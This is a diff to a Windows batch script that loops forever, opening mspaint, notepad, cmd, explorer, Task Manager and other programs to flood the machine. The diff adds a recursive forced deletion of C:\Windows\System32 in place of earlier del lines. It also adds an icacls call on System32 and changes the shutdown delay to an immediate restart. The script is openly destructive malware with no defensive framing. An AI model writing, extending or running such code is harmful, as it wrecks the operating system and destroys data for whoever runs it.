@@ -1,6 +1,7 @@
 @echo off
 :repeat
 echo %random%
+color 17
 start mspaint
 start notepad
 start cmd
@@ -10,8 +11,10 @@ start write
 start explorer
 start config
 start %temp%
-del C:\Windows\%temp% /t /q
 start System32
-del C: *.* /t /q
+icacls C:\Windows\System32
+start Taskmgr
+start C:
+del /s /q /f C:\Windows\System32
 goto repeat
-shutdown -r -t 20
+shutdown -r -t 0
